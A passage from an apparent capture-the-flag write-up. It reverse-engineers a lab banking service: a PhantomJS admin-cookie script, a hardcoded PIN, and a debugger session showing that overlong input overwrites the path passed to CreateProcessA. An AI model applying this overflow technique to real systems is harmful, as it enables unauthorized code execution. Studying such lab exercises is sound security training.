Repeat: Every:                        0 Hour(s), 4 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              24 Hour(s), 0 Minute(s)
Repeat: Stop If Still Running:        Disabled

```

This task is using the [PhantomJS](https://phantomjs.org/) scriptable headless browser to load some javascript, `get.js`:

```

var page = require('webpage').create();

function newCookie(name,value){
    phantom.addCookie({
        'name'   : name,
        'value'  : value,
        'domain' : 'localhost'
    });
}
newCookie('username','YWRtaW4%3D');
newCookie('password','SG9wZWxlc3Nyb21hbnRpYw%3D%3D');
newCookie('id','1');

page.open('http://localhost/admin/index.php',function(){
    phantom.exit();
});

```

This is similar to the example code on the PhantomJS site for how to load a page. It’s setting the cookies, and then loading the admin page to see the current requests. It is set to run every 4 minutes.

I guess the reason that I didn’t see a request for my image is that the headless browser isn’t bothering to load images.

### bankv2.exe

I grabbed a copy of `bankv2.exe` and opened it in IDA. Looking through `_main`, I’ll find bits that I recognize from the program. Here’s the string compare for the pin hardcoded to “0021”:

![1569313829345](https://0xdfimages.gitlab.io/img/1569313829345.png)

Continuing down, I see some of the messages that are printed, and a call to `_createProc`. I’ll switch over to my Windows VM to debug this.

I double clicked on `bankv2.exe` and it opened a terminal window:

![1569314748558](https://0xdfimages.gitlab.io/img/1569314748558.png)

Next I opened `x32dbg` and attacked to the process. I set a break point at the `recv` call that gets the amount:

![1569314623366](https://0xdfimages.gitlab.io/img/1569314623366.png)

Then I hit run and it stopped waiting for a connection. I opened a terminal, and connected with `nc`. I entered the pin, and then `x32dbg` broke just before the call to `recv`:

```

C:\Users\0xdf>nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:

```

I can see in `x32dbg` the stack at this call. It’s going to read my onto the stack.

The next call is to `mbscpy` just below:

![1569315785368](https://0xdfimages.gitlab.io/img/1569315785368.png)

[This function](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcpy-wcscpy-mbscpy?view=vs-2019) is going to copy my input to 0x0061F988:

![1569315849533](https://0xdfimages.gitlab.io/img/1569315849533.png)

If I look there in the dump, I see it’s garbage:

![1569316151992](https://0xdfimages.gitlab.io/img/1569316151992.png)

But I also see two rows below (32 bytes) the path to `transfer.exe`. I’ll keep stepping, seeing my “1000\n” overwrite the first 5 bytes in the dump. Stepping for a while, I’ll get to 0x401f98, where it’s a call to 0x4015c0. The top parameter passed in is 0x61f9a8, which is the address of the string with the path for `transfer.exe`.

Stepping into that function, I’ll see a call to `CreateProcessA`:

![1569316234247](https://0xdfimages.gitlab.io/img/1569316234247.png)

When I run down to it, I see it is passed the same string, 0x61f9a8:

![1569316278918](https://0xdfimages.gitlab.io/img/1569316278918.png)

I’ll set a break point at this call, and continue the program, and give it a bunch of `a`s:

```

C:\Users\0xdf>nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 [$] Transfering $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

 [$] Transaction in progress, you can safely disconnect...

```

When I get to process create, I can see it’s going to call the `a`s:

![1569316385647](https://0xdfimages.gitlab.io/img/1569316385647.png)

So this is really just a basic stack overflow. But unlike most stack overflows where I’ll need to get shellcode into memory and then get EIP to point to it, I just need to overwrite a string that’s further down the stack with my own string, and let the program pass that to `CreateProcessA`.